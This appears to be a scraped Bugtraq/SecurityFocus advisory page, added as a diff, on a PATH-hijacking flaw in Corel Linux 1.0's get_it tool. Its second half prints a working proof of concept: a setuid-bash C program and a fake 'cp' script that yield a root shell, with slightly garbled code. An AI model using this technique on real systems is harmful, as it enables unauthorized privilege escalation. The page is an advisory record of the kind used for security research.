@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid928<p><b><span style="font-size: 18pt;">Corel Linux get_it PATH Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/928/info">info</a><br><a href="http://www.securityfocus.com/bid/928/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/928/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/928/solution">solution</a><br><a href="http://www.securityfocus.com/bid/928/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				928
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Environment Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 12 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 12 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to Bugtraq by Cesar Tascon Alvarez &lt;tascon@enete.gui.uva.es&gt; on January 12, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Corel Linux OS 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 The following example was included in a post to Bugtraq by Cesar Tascon Alvarez &lt;tascon@gui.uva.es&gt; regarding this issue:<br/><br/>CorelLinux:~$ id<br/>uid=1001(tascon) gid=1001(tascon) groups=1001(tascon)<br/>CorelLinux:~$ cat misu.c<br/>#include &lt;stdio.h&gt;<br/>#include &lt;unistd.h&gt;<br/><br/>main(argc,argv)<br/>int argc;<br/>char **argv;<br/>{<br/>if (argc==2);<br/>setuid(atoi(argv1));<br/>execlp("/bin/bash","/bin/bash",NULL);<br/>}<br/>CorelLinux:~$ cc -o misu misu.c<br/>CorelLinux:~$ pwd<br/>/home/tascon<br/>CorelLinux:~$ cat cp<br/>echo $1 $2 $3<br/>/home/tascon/misu 0<br/>CorelLinux:~$ export PATH=.:$PATH<br/>CorelLinux:~$ get_it <br/>/usr/X11R6/share/apps/get_it/html/largebanner.html /tmp/Get_It.0.a05872<br/>CorelLinux:~# id<br/>uid=0(root) gid=1001(tascon) groups=1001(tascon)<br/>CorelLinux:~# exit<br/>exit<br/>/usr/X11R6/share/apps/get_it/html/smallbanner.html /tmp/Get_It.1.a05872<br/>CorelLinux:~# id<br/>uid=0(root) gid=1001(tascon) groups=1001(tascon)
+	
+		<ul>
+</ul>
+</div>
